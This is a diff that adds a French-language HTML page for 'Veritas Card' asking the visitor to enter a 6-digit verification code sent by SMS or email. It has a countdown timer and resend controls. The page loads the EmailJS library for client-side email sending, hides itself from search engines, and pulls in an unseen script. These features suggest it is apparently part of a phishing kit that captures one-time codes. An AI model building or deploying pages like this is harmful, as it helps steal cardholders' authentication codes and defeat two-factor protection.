@@ -1,0 +1,68 @@
+ <!DOCTYPE html>
+
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>  Veritas Card  </title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="style.css">
+ <link rel="icon" type="image/jpeg" href="favicon.jpg">
+<meta name="robots" content="noindex, nofollow">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<script src="code.js" defer></script>
+
+</head>
+<body>
+  <div class="page">
+
+   
+    <div class="main">
+      <div class="card">
+
+        <div class="step active" id="step2">
+          <h1>Code de vérification</h1>
+
+          <p class="subtitle">
+            Un code à 6 chiffres a été envoyé par <b>SMS</b> ou par <b>email</b>
+            <span id="otpPhone"></span>.
+          </p>
+
+          <form id="otpForm">
+            <div class="field">
+              <label for="otpSingle">Code envoyé par SMS</label>
+              <input type="text" inputmode="numeric" maxlength="6"
+                id="otpSingle" class="otp-single"
+                placeholder="— — — — — —"
+                autocomplete="one-time-code" required>
+            </div>
+
+            <p class="expiry-note">
+              Ce code expire dans <b id="otpTimer">30</b>s.
+            </p>
+
+            <button type="submit" class="btn-signin">Confirmer</button>
+            <div id="result"></div>
+
+            <div class="timer-row">
+              <span class="resend disabled" id="resendLink">
+                Renvoyer le code <span id="resendCount">(dans 10s)</span>
+              </span>
+              <a href="#" class="no-number-link">
+                Retour · je n'ai plus ce numéro
+              </a>
+            </div>
+          </form>
+        </div>
+
+      </div>
+    </div>
+
+  </div>
+</body>
+</html>
